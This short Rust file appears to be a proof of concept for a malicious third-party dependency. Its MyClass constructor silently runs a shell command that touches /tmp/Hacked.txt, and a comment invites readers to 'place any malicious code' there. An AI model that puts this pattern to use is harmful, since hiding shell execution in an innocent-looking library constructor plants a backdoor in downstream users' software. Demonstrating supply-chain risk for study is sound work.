
// Define a class in the dependency, that we suppose is the popular
// one for which this 3rd-party dependency is tipically downloaded
// by downstream users

pub struct MyClass {
    name: String,
}

impl MyClass {
    pub fn new(name: &str) -> MyClass {
        use std::process::Command;
        let _output =  Command::new("sh")
            .arg("-c")
            .arg("touch /tmp/Hacked.txt")     // Place any malicious code :)
            .output();

        MyClass {
            name: name.to_string(),
        }
    }

    pub fn say_hello(&self) -> String {
        format!("Hello from {}!", self.name)
    }
}



